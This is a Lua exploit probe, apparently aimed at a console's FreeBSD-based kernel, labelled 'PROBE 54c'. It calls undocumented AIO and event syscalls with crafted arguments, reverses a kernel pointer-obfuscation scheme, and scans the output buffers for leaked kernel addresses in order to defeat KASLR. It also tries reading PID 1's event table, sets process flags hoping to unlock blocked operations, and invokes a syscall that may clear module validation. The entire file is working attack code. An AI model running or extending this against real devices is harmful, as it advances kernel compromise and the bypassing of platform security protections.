-- CRASH_CLASS: HIGH
-- PROBE 54c: Comprehensive AIO subsystem attack (syscalls 661-670)
--
-- Based on deep static analysis of 13.60 kernel dumps:
-- - AIO 663 body at 0x3b0210 (aio_multi_wait): 801 instructions, 58 call sites
-- - Pointer obfuscation: f(x) = x ^ (x>>4) at 0x3b072e, reversible
-- - Stack clash: 32-bit LEA at 0x3b03d4 overflows for count >= 0x40000000
-- - Count bounds: <= 0xffffff (16M) at 0x3b02b8
-- - Mode check: < 3 at 0x3b03b8
-- - Event object lookup via proc->0xc48 table
--
-- Syscall signatures (from sysent narg + assembly):
--   661(4): event_create/register — narg=4
--   662(3): event_query — narg=3 (reads obfuscated pointers)
--   663(5): aio_multi_wait — narg=5 (array_ptr, count, mode, timeout, ?)
--   664(3): event_signal — narg=3
--   665(2): event helper — narg=2
--   666(3): event helper — narg=3
--   667(2): separate handler at 0x4a31a0 — narg=2
--   668(2): event_query variant — narg=2 (shares obfuscation)
--   669(5): complex handler — narg=5
--   670(4): cross-process event — narg=4

print("=== PROBE 54c: AIO FULL ATTACK ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

-- Reverse the pointer obfuscation: f(x) = x ^ (x >> 4)
-- Since SAR preserves sign and top bits are stable, we recover nibble-by-nibble
-- from MSB down: top 4 bits are clear, then each next nibble is XOR'd with
-- the nibble above it (already recovered).
local function deobfuscate_ptr(h, l)
    -- Work with two 32-bit halves
    -- The transform is: out = val ^ (val >>> 4) [arithmetic shift]
    -- To reverse: val[63:60] = out[63:60] (top nibble unchanged by sar 4)
    -- Then for each nibble i from 59:56 down to 3:0:
    --   val[nibble_i] = out[nibble_i] ^ val[nibble_i+1]

    -- Combine into a single number representation
    -- Since Lua 5.1 lacks 64-bit integers, work nibble by nibble on h and l
    local function get_nibble(hi, lo, pos)
        -- pos 0 = lowest nibble of lo, pos 15 = highest nibble of hi
        if pos < 8 then
            local shift = pos * 4
            local mask = 0xF
            return math.floor(lo / (2^shift)) % 16
        else
            local shift = (pos - 8) * 4
            return math.floor(hi / (2^shift)) % 16
        end
    end

    local function set_nibble(hi, lo, pos, val)
        if pos < 8 then
            local shift = pos * 4
            local p = 2^shift
            lo = lo - (math.floor(lo / p) % 16) * p + val * p
        else
            local shift = (pos - 8) * 4
            local p = 2^shift
            hi = hi - (math.floor(hi / p) % 16) * p + val * p
        end
        return hi, lo
    end

    -- Extract obfuscated nibbles
    local ob = {}
    for i = 0, 15 do
        ob[i] = get_nibble(h, l, i)
    end

    -- Recover original nibbles top-down
    local orig = {}
    orig[15] = ob[15]  -- top nibble unchanged (SAR keeps sign bits)
    for i = 14, 0, -1 do
        -- The SAR by 4 means nibble i of (val>>4) = nibble i+1 of val
        -- So obfuscated[i] = original[i] XOR original[i+1]
        -- But for arithmetic shift, the sign extension fills from top
        -- For negative (kernel) pointers, top nibble is 0xF, SAR fills with F
        -- Actually: nibble i of (x SAR 4) = nibble (i+1) of x, for i < 15
        -- And nibble 15 of (x SAR 4) = nibble 15 of x (sign preserved)
        local xor_val = orig[i + 1]
        -- XOR to recover: original[i] = obfuscated[i] XOR original[i+1]
        local bxor = 0
        local a, b = ob[i], xor_val
        for bit = 0, 3 do
            local p = 2^bit
            local ba = math.floor(a / p) % 2
            local bb = math.floor(b / p) % 2
            if ba ~= bb then bxor = bxor + p end
        end
        orig[i] = bxor
    end

    -- Reconstruct hi/lo
    local rh, rl = 0, 0
    for i = 0, 15 do
        rh, rl = set_nibble(rh, rl, i, orig[i])
    end
    return rh, rl
end

local function is_kptr(h)
    return h >= 0xFFFF8000 and h < 0xFFFFFFFF
end

-- =====================================================
-- PHASE 1: Survival test — which Sony AIO syscalls return?
-- =====================================================
print("--- PHASE 1: AIO Survival Matrix (661-670) ---")
print("If output stops at a syscall, that one kills the process.")
print("")

local survived = {}
local results = {}

-- Test each syscall with safe NULL args first
local aio_syscalls = {
    {661, 4, "event_create"},
    {662, 3, "event_query"},
    {663, 5, "aio_multi_wait"},
    {664, 3, "event_signal"},
    {665, 2, "event_helper_a"},
    {666, 3, "event_helper_b"},
    {667, 2, "separate_handler"},
    {668, 2, "event_query_b"},
    {669, 5, "complex_handler"},
    {670, 4, "cross_proc_event"},
}

for _, entry in ipairs(aio_syscalls) do
    local num, narg, name = entry[1], entry[2], entry[3]
    print(string.format("  [BEFORE] sys %d (%s, narg=%d)", num, name, narg))
    local sc = make_syscall(num)
    local ok, ret = pcall(function()
        return sc(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        local rv = signed32(ret)
        print(string.format("  [RETURNED] sys %d: ret=%d (%s)", num, rv, hexval(ret)))
        survived[num] = true
        results[num] = rv
    else
        print(string.format("  [ERROR] sys %d: %s", num, tostring(ret)))
        survived[num] = false
    end
end
print("")

-- =====================================================
-- PHASE 2: Event creation (661) — try to create an event object
-- =====================================================
print("--- PHASE 2: Event Object Creation (sys 661) ---")
print("")

if survived[661] then
    local sc661 = make_syscall(661)
    local outbuf = memory.alloc(0x200)

    -- Try different argument patterns for event creation
    -- 661 has narg=4: likely (event_type, flags, ???, out_handle)
    local patterns = {
        {0, 0, 0, "outbuf", "zero args"},
        {1, 0, 0, "outbuf", "type=1"},
        {0, 1, 0, "outbuf", "flags=1"},
        {1, 1, 0, "outbuf", "type=1,flags=1"},
        {0x80, 0, 0, "outbuf", "type=0x80"},
        {0, 0x80000, 0, "outbuf", "flags=0x80000"},
    }

    for _, pat in ipairs(patterns) do
        for i = 0, 0x3F, 4 do safe_wd(outbuf + i, 0) end
        local a1 = uint64(pat[1])
        local a2 = uint64(pat[2])
        local a3 = uint64(pat[3])
        local a4 = (pat[4] == "outbuf") and uint64(outbuf) or uint64(pat[4])

        local ok, ret = pcall(function() return sc661(a1, a2, a3, a4, uint64(0), uint64(0)) end)
        if ok then
            local rv = signed32(ret)
            local q0 = safe_rq(outbuf)
            local q1 = safe_rq(outbuf + 8)
            print(string.format("  661(%s): ret=%d  buf[0]=%s  buf[8]=%s",
                pat[5], rv, hexval(q0), hexval(q1)))
            if rv == 0 then
                print("  >>> EVENT CREATED SUCCESSFULLY")
                -- Check for handle value
                local handle = safe_rd(outbuf)
                if handle and handle > 0 then
                    print("  >>> EVENT HANDLE: " .. string.format("0x%X", handle))
                end
            end
            -- Scan for kernel pointers
            for i = 0, 56, 8 do
                local qv = safe_rq(outbuf + i)
                if qv then
                    local h, l = get_hi_lo(qv)
                    if is_kptr(h) then
                        print(string.format("  >>> RAW KPTR at +%d: %s", i, hexval(qv)))
                    end
                end
            end
        else
            print(string.format("  661(%s): CRASHED: %s", pat[5], tostring(ret)))
        end
    end
else
    print("  sys 661 did not survive, skipping")
end
print("")

-- =====================================================
-- PHASE 3: Event query with obfuscated pointers (662/668)
-- =====================================================
print("--- PHASE 3: Event Query — Obfuscated Pointer Leak (sys 662/668) ---")
print("")

for _, qnum in ipairs({662, 668}) do
    if survived[qnum] then
        local sc = make_syscall(qnum)
        local outbuf = memory.alloc(0x400)

        -- Try with output buffer as first arg, varying second arg
        for handle = 0, 3 do
            for i = 0, 0x1FF, 4 do safe_wd(outbuf + i, 0) end

            local ok, ret = pcall(function()
                return sc(uint64(handle), uint64(outbuf), uint64(0x200), uint64(0), uint64(0), uint64(0))
            end)
            if ok then
                local rv = signed32(ret)
                print(string.format("  %d(handle=%d, outbuf, 0x200): ret=%d", qnum, handle, rv))

                -- Scan output for obfuscated or raw kernel pointers
                local found_any = false
                for i = 0, 0x1F0, 8 do
                    local qv = safe_rq(outbuf + i)
                    if qv then
                        local h, l = get_hi_lo(qv)
                        if h ~= 0 or l ~= 0 then
                            -- Try deobfuscation
                            local dh, dl = deobfuscate_ptr(h, l)
                            local raw_is_kptr = is_kptr(h)
                            local deob_is_kptr = is_kptr(dh)

                            if raw_is_kptr or deob_is_kptr or (h > 0 and h < 0x10) then
                                print(string.format("    +%03X: raw=%s", i, hexval(qv)))
                                if deob_is_kptr then
                                    print(string.format("    +%03X: DEOBFUSCATED KPTR: 0x%08X_%08X", i, dh, dl))
                                    found_any = true
                                end
                                if raw_is_kptr then
                                    print(string.format("    +%03X: RAW KPTR: %s", i, hexval(qv)))
                                    found_any = true
                                end
                            end
                        end
                    end
                end
                if not found_any and rv == 0 then
                    -- Dump first 64 bytes of output
                    print("    First 64 bytes (hex):")
                    for i = 0, 56, 8 do
                        local qv = safe_rq(outbuf + i)
                        print(string.format("    +%02X: %s", i, hexval(qv)))
                    end
                end
            else
                print(string.format("  %d(handle=%d): CRASHED: %s", qnum, handle, tostring(ret)))
            end
        end

        -- Also try: outbuf as arg2 (different ABI layout)
        for i = 0, 0xFF, 4 do safe_wd(outbuf + i, 0) end
        local ok2, ret2 = pcall(function()
            return sc(uint64(0), uint64(outbuf), uint64(0), uint64(0), uint64(0), uint64(0))
        end)
        if ok2 then
            local rv = signed32(ret2)
            print(string.format("  %d(0, outbuf, 0): ret=%d", qnum, rv))
            for i = 0, 56, 8 do
                local qv = safe_rq(outbuf + i)
                if qv then
                    local h, l = get_hi_lo(qv)
                    if h ~= 0 or l ~= 0 then
                        print(string.format("    +%02X: %s", i, hexval(qv)))
                        local dh, dl = deobfuscate_ptr(h, l)
                        if is_kptr(dh) then
                            print(string.format("    DEOBFUSCATED: 0x%08X_%08X", dh, dl))
                        end
                    end
                end
            end
        end
    else
        print(string.format("  sys %d did not survive, skipping", qnum))
    end
end
print("")

-- =====================================================
-- PHASE 4: aio_multi_wait (663) — the main Relapse target
-- =====================================================
print("--- PHASE 4: aio_multi_wait (sys 663) ---")
print("")

if survived[663] then
    local sc663 = make_syscall(663)

    -- 663 signature from assembly: (td, user_array_ptr, count, mode, timeout_ptr)
    -- FreeBSD ABI: arg1=rdi(td is implicit), so user args: rsi, rdx, rcx, r8, r9
    -- Mapped through make_syscall: arg1->rdi, arg2->rsi, arg3->rdx, arg4->rcx, arg5->r8

    -- Test 4a: Basic call with small valid count
    local array_buf = memory.alloc(0x100)
    local timeout = memory.alloc(16)
    local outbuf = memory.alloc(0x400)

    -- Set up array with small test handles (0, 1, 2)
    for i = 0, 0xFF, 4 do safe_wd(array_buf + i, 0) end
    safe_wd(array_buf, 0)      -- handle 0
    safe_wd(array_buf + 4, 1)  -- handle 1

    -- Zero timeout (immediate return)
    safe_wd(timeout, 0)
    safe_wd(timeout + 4, 0)
    safe_wd(timeout + 8, 0)
    safe_wd(timeout + 12, 0)

    -- Argument mapping for 663 (narg=5):
    -- From assembly analysis:
    --   The wrapper at 0x3b01f0 reads rsi (arg2=user_array_ptr) into r15
    --   rdx (arg3=count) goes to the count checks
    --   r8d (arg5=mode) checked against 3
    --   r9 (arg6=timeout_ptr) stored at [rbx+0x60]
    -- So: 663(array_ptr, count, ??, mode, timeout)

    print("  4a: 663(array, count=1, 0, mode=0, timeout)")
    do
        local ok, ret = pcall(function()
            return sc663(uint64(array_buf), uint64(1), uint64(0), uint64(0), uint64(timeout), uint64(0))
        end)
        if ok then
            print("  ret=" .. signed32(ret) .. " (" .. hexval(ret) .. ")")
        else
            print("  CRASHED: " .. tostring(ret))
        end
    end

    print("  4b: 663(array, count=2, 0, mode=1, timeout)")
    do
        local ok, ret = pcall(function()
            return sc663(uint64(array_buf), uint64(2), uint64(0), uint64(1), uint64(timeout), uint64(0))
        end)
        if ok then
            print("  ret=" .. signed32(ret) .. " (" .. hexval(ret) .. ")")
        else
            print("  CRASHED: " .. tostring(ret))
        end
    end

    print("  4c: 663(array, count=2, 0, mode=2, timeout)")
    do
        local ok, ret = pcall(function()
            return sc663(uint64(array_buf), uint64(2), uint64(0), uint64(2), uint64(timeout), uint64(0))
        end)
        if ok then
            print("  ret=" .. signed32(ret) .. " (" .. hexval(ret) .. ")")
        else
            print("  CRASHED: " .. tostring(ret))
        end
    end

    -- Test the output buffer for data written back
    print("  4d: Check if 663 writes back to array (KASLR leak check)")
    for i = 0, 0xFF, 4 do safe_wd(array_buf + i, 0xDEAD0000 + i) end
    safe_wd(array_buf, 0)

    do
        local ok, ret = pcall(function()
            return sc663(uint64(array_buf), uint64(1), uint64(0), uint64(0), uint64(timeout), uint64(0))
        end)
        if ok then
            print("  ret=" .. signed32(ret))
            -- Check what was written
            for i = 0, 0x3F, 8 do
                local qv = safe_rq(array_buf + i)
                if qv then
                    local h, l = get_hi_lo(qv)
                    local expected_hi = 0
                    local expected_lo = 0xDEAD0000 + i
                    if h ~= expected_hi or l ~= expected_lo then
                        print(string.format("    +%02X: MODIFIED -> %s", i, hexval(qv)))
                        local dh, dl = deobfuscate_ptr(h, l)
                        if is_kptr(dh) then
                            print(string.format("    DEOBFUSCATED KPTR: 0x%08X_%08X <<<< KASLR DEFEATED", dh, dl))
                        end
                        if is_kptr(h) then
                            print(string.format("    RAW KPTR: %s <<<< KASLR DEFEATED", hexval(qv)))
                        end
                    end
                end
            end
        else
            print("  CRASHED: " .. tostring(ret))
        end
    end
else
    print("  sys 663 did not survive, skipping")
end
print("")

-- =====================================================
-- PHASE 5: Cross-process event manipulation (670)
-- =====================================================
print("--- PHASE 5: Cross-Process Event Access (sys 670) ---")
print("")

if survived[670] then
    local sc670 = make_syscall(670)
    -- 670 narg=4: likely (target_pid, slot_index, outbuf, ???)
    -- Assembly shows PID-based lookup -> target_proc->0xc48 event table

    -- Get our own PID first
    local sc20 = make_syscall(20) -- getpid
    local ok_pid, our_pid = pcall(function() return sc20(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
    local pid = 0
    if ok_pid then
        pid = to_num(our_pid)
        print("  Our PID: " .. pid)
    end

    local outbuf = memory.alloc(0x200)

    -- Try reading our own process event table
    for slot = 0, 7 do
        for i = 0, 0x3F, 4 do safe_wd(outbuf + i, 0) end
        local ok, ret = pcall(function()
            return sc670(uint64(pid), uint64(slot), uint64(outbuf), uint64(0), uint64(0), uint64(0))
        end)
        if ok then
            local rv = signed32(ret)
            local q0 = safe_rq(outbuf)
            print(string.format("  670(pid=%d, slot=%d, outbuf): ret=%d  buf[0]=%s", pid, slot, rv, hexval(q0)))
            if rv == 0 and q0 then
                local h, l = get_hi_lo(q0)
                if is_kptr(h) then
                    print("  >>> KERNEL POINTER LEAKED via cross-process event!")
                end
                local dh, dl = deobfuscate_ptr(h, l)
                if is_kptr(dh) then
                    print(string.format("  >>> DEOBFUSCATED KPTR: 0x%08X_%08X", dh, dl))
                end
            end
        else
            print(string.format("  670(pid=%d, slot=%d): CRASHED: %s", pid, slot, tostring(ret)))
        end
    end

    -- Try targeting system process (PID 1)
    for i = 0, 0x3F, 4 do safe_wd(outbuf + i, 0) end
    local ok1, ret1 = pcall(function()
        return sc670(uint64(1), uint64(0), uint64(outbuf), uint64(0), uint64(0), uint64(0))
    end)
    if ok1 then
        print(string.format("  670(pid=1, slot=0): ret=%d", signed32(ret1)))
        if signed32(ret1) == 0 then
            print("  >>> CAN ACCESS PID 1 EVENTS — CROSS-PROCESS WORKS")
            for i = 0, 56, 8 do
                local qv = safe_rq(outbuf + i)
                if qv then
                    local h, l = get_hi_lo(qv)
                    if h ~= 0 or l ~= 0 then
                        print(string.format("    +%02X: %s", i, hexval(qv)))
                    end
                end
            end
        end
    else
        print("  670(pid=1): CRASHED: " .. tostring(ret1))
    end
else
    print("  sys 670 did not survive, skipping")
end
print("")

-- =====================================================
-- PHASE 6: Quick test of other critical syscalls
-- =====================================================
print("--- PHASE 6: Additional High-Value Syscalls ---")
print("")

-- sys 639: Memory region info (no priv_check, may leak kernel VAs)
print("  [sys 639] Memory Region Info (narg=5)")
do
    local sc639 = make_syscall(639)
    local outbuf = memory.alloc(0x400)
    for i = 0, 0x1FF, 4 do safe_wd(outbuf + i, 0) end
    -- Try: 639(0, outbuf, outlen, 0, 0)
    local ok, ret = pcall(function()
        return sc639(uint64(0), uint64(outbuf), uint64(0x200), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        local rv = signed32(ret)
        print(string.format("    ret=%d", rv))
        -- Scan for kernel pointers
        local kptr_count = 0
        for i = 0, 0x1F0, 8 do
            local qv = safe_rq(outbuf + i)
            if qv then
                local h, l = get_hi_lo(qv)
                if is_kptr(h) then
                    print(string.format("    KPTR at +%03X: %s", i, hexval(qv)))
                    kptr_count = kptr_count + 1
                    if kptr_count >= 10 then
                        print("    (truncated, found 10+ kernel pointers)")
                        break
                    end
                end
            end
        end
        if kptr_count == 0 and rv == 0 then
            -- Dump first 64 bytes
            for i = 0, 56, 8 do
                local qv = safe_rq(outbuf + i)
                if qv then
                    local h, l = get_hi_lo(qv)
                    if h ~= 0 or l ~= 0 then
                        print(string.format("    +%02X: %s", i, hexval(qv)))
                    end
                end
            end
        end
    else
        print("    CRASHED: " .. tostring(ret))
    end
end
print("")

-- sys 643: Process flag OR (no priv_check, writes proc+0xa34)
print("  [sys 643] Process Flag OR (narg=1)")
do
    local sc643 = make_syscall(643)
    -- Read current state first with arg=0
    local ok0, ret0 = pcall(function() return sc643(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
    if ok0 then
        print(string.format("    643(0): ret=%d (%s)", signed32(ret0), hexval(ret0)))
    else
        print("    643(0): CRASHED: " .. tostring(ret0))
    end
    -- Try setting debug flag bit (if p_flag2 affects security decisions)
    local ok1, ret1 = pcall(function() return sc643(uint64(0x800), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
    if ok1 then
        print(string.format("    643(0x800): ret=%d (%s)", signed32(ret1), hexval(ret1)))
        if signed32(ret1) == 0 then
            print("    >>> FLAG 0x800 SET SUCCESSFULLY — check if it unlocks blocked operations")
        end
    else
        print("    643(0x800): CRASHED: " .. tostring(ret1))
    end
end
print("")

-- sys 598: Entry 0x000 Info Leak (narg=2)
print("  [sys 598] Entry Info Leak (narg=2)")
do
    local sc598 = make_syscall(598)
    local outbuf = memory.alloc(0x100)
    for i = 0, 0x3F, 4 do safe_wd(outbuf + i, 0) end
    local ok, ret = pcall(function() return sc598(uint64(outbuf), uint64(0x40), uint64(0), uint64(0), uint64(0), uint64(0)) end)
    if ok then
        local rv = signed32(ret)
        print(string.format("    ret=%d", rv))
        for i = 0, 56, 8 do
            local qv = safe_rq(outbuf + i)
            if qv then
                local h, l = get_hi_lo(qv)
                if h ~= 0 or l ~= 0 then
                    print(string.format("    +%02X: %s", i, hexval(qv)))
                    if is_kptr(h) then
                        print("    >>> KERNEL POINTER LEAKED")
                    end
                end
            end
        end
    else
        print("    CRASHED: " .. tostring(ret))
    end
end
print("")

-- sys 625: AMD PMC MSR Read/Write (narg=4, has WRMSR)
print("  [sys 625] AMD PMC R/W (narg=4)")
do
    local sc625 = make_syscall(625)
    local outbuf = memory.alloc(0x100)
    -- Try command 0 (likely read/enumerate)
    for cmd = 0, 5 do
        for i = 0, 0x3F, 4 do safe_wd(outbuf + i, 0) end
        local ok, ret = pcall(function()
            return sc625(uint64(cmd), uint64(outbuf), uint64(0x40), uint64(0), uint64(0), uint64(0))
        end)
        if ok then
            local rv = signed32(ret)
            local q0 = safe_rq(outbuf)
            print(string.format("    625(cmd=%d, outbuf): ret=%d  buf[0]=%s", cmd, rv, hexval(q0)))
        else
            print(string.format("    625(cmd=%d): CRASHED: %s", cmd, tostring(ret)))
        end
    end
end
print("")

-- sys 675: Global state reset (40 bytes, 3 global writes, no checks)
print("  [sys 675] Global State Reset (narg=0)")
do
    local sc675 = make_syscall(675)
    local ok, ret = pcall(function() return sc675(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
    if ok then
        print(string.format("    ret=%d (%s)", signed32(ret), hexval(ret)))
        if signed32(ret) == 0 then
            print("    >>> GLOBAL STATE RESET SUCCEEDED — module validation may be cleared")
        end
    else
        print("    CRASHED: " .. tostring(ret))
    end
end

print("")
print("=== PROBE 54c COMPLETE ===")
print("Review: Any KPTR, DEOBFUSCATED KPTR, or KASLR DEFEATED line = breakthrough")
print("Any ret=0 on 661/662/663/670 = exploitable path confirmed on 14.10")
